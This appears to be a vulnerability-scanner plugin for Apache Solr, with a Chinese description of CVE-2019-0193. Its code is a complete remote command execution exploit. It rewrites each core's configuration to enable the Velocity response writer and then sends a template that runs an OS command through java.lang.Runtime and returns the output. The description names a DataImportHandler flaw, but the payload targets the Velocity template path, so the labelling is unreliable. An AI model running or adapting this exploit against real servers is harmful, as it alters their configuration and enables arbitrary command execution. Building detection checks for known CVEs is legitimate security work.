# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Apache Solr 远程命令执行漏洞",
        "description": "2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，此次漏洞出现在Apache Solr的 DataImportHandler，通过 DataImportHandler 可以从数据库和其他源中批量把数据导入索引库中，它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，当solr开启了 DataImportHandler 功能后，攻击者可以通过构造危险的请求，从而造成远程命令执行",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(method='get', path='./solr/admin/cores?indexInfo=false&wt=json', timeout=15)
        if r.status_code != 200:
            return {}
        for i in r.json()['status']:
            random_str = self.build_random_str(12)
            r1 = self.request(
                method='POST',
                path=f'./solr/{i}/config',
                json='{"update-queryresponsewriter": {"startup": "lazy","name": "velocity","class": "solr.VelocityResponseWriter","template.base.dir": "","solr.resource.loader.enabled": "true","params.resource.loader.enabled": "true"}}',
                timeout=15,
                headers={'Content-Type': 'application/json'}
            )
            if r1.status_code == 200:
                r2 = self.request(
                    method="GET",
                    path=f"./solr/{i}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo {random_str}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
                    timeout=30
                )
                if random_str in r2.text:
                    return {"LoopholeInfo": self.__info__}
